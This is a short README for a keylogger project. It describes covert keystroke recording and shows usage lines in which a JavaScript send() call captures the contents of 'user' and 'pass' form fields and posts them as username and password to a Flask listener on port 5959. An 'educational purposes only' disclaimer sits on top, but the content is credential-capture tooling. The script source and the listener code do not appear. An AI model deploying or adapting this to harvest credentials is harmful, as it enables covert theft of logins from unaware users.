# keylog

keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a keyboard, typically covertly, so that a person using the keyboard is unaware that their actions are being monitored.

## Disclaimer
This script is for educational purposes only. Do not use it for illegal activities. You are solely responsible for your own actions!

## Usage
> keylogger.js
```js
// Call the send function
send(element_id, server_url, parameter_name);

// For listener.py
// According to listener.py the route should be '/main'
// Parameters for username and password should be username and password
send('user','http://localhost:5959/main','username');
send('pass','http://localhost:5959/main','password');
```
> listener.py
```bash
# install flask
pip3 install flask
```
runs on port 5959

